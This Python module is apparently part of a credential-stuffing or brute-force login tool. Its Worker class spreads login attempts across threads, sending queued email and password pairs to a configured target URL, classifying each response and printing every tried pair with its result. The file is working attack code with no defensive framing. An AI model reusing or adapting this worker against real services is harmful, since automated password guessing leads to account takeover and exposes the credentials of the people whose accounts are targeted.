import threading
import time

from config import TARGET_URL, REQUEST_DELAY
from core.response_analyzer import ResponseAnalyzer
from models.result import AttemptResult
from utils.logger import logger

class Worker:

    def __init__(self, queue_manager, engine, metrics):

        self.queue_manager = queue_manager
        self.engine = engine
        self.metrics = metrics

    def run(self):

        while True:

            task = self.queue_manager.get_task()

            try:

                response, elapsed = self.engine.login_attempt(
                    TARGET_URL,
                    task
                )

                status = ResponseAnalyzer.analyze(response)

                result = AttemptResult(
                    email=task.email,
                    password=task.password,
                    status=status,
                    status_code=response.status_code,
                    response_time=elapsed
                )

                self.metrics.update(status)

                logger.info(result)

                print(
                    f"[{status}] "
                    f"{task.email}:{task.password}"
                )

                time.sleep(REQUEST_DELAY)

            finally:
                self.queue_manager.task_done()

    def start(self, threads=5):

        for _ in range(threads):

            thread = threading.Thread(
                target=self.run,
                daemon=True
            )

            thread.start()